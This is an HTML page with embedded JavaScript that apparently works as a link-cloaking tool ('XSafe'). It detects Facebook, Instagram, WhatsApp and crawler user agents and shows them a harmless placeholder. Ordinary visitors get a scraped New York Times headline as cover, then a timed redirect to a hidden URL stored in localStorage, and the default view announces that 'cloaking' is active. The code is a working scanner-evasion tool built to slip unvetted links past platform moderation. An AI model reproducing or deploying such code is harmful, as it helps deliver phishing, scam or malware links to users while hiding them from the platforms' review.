<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XSafe Short</title>

<style>
body{margin:0;font-family:Arial;background:#0b1220;color:#fff}
.container{max-width:900px;margin:auto;padding:20px}
.card{background:#111827;padding:20px;border-radius:20px;margin-top:20px;text-align:center}
</style>
</head>

<body>
<div id="app"></div>

<script>

// ==============================
// BOT DETECTION (CLOAKING)
// ==============================
function isBot(){
  return /facebookexternalhit|Facebot|FBAN|FBAV|Instagram|WhatsApp|bot|crawl|spider/i.test(navigator.userAgent);
}

// ==============================
// REAL ARTICLE API (FREE SOURCE)
// ==============================
async function fetchArticle(){
  try{
    const res = await fetch('https://api.allorigins.win/raw?url=https://rss.nytimes.com/services/xml/rss/nyt/HomePage.xml');
    const text = await res.text();

    const parser = new DOMParser();
    const xml = parser.parseFromString(text, "text/xml");
    const items = xml.querySelectorAll("item");

    const random = items[Math.floor(Math.random()*items.length)];

    const title = random.querySelector("title")?.textContent || "Latest News";
    const desc = random.querySelector("description")?.textContent || "";

    return `
      <h2>${title}</h2>
      <p style="max-width:700px;margin:auto;line-height:1.6">${desc}</p>
    `;

  }catch(e){
    return `<h2>Loading content...</h2><p>Preparing article...</p>`;
  }
}


// ==============================
// REDIRECT SYSTEM (CLOAK MODE)
// ==============================
window.onload = async function(){

  const hash = location.hash.replace('#','');

  if(hash){
    const data = JSON.parse(localStorage.getItem(hash));
    if(!data) return;

    // BOT = show safe page only
    if(isBot()){
      document.body.innerHTML = "<h2>Welcome to our website</h2>";
      return;
    }

    // REAL USER = show article
    const article = await fetchArticle();

    document.body.innerHTML = `
      <div class="container">
        <div class="card">
          ${article}
          <p>Loading secure page...</p>
          <p id="count"></p>
        </div>
      </div>
    `;

    let t = 8;
    const timer = setInterval(()=>{
      document.getElementById('count').innerText = "Redirect in " + t + " sec";
      t--;

      if(t < 0){
        clearInterval(timer);
        window.location.href = data.url;
      }
    },1000);

    return;
  }

  // DEFAULT PAGE
  document.getElementById('app').innerHTML = `
    <div class="container">
      <div class="card">
        <h2>XSafe GOD MODE ACTIVE</h2>
        <p>Your cloaking + real article system is running.</p>
      </div>
    </div>
  `;
}

</script>
</body>
</html>
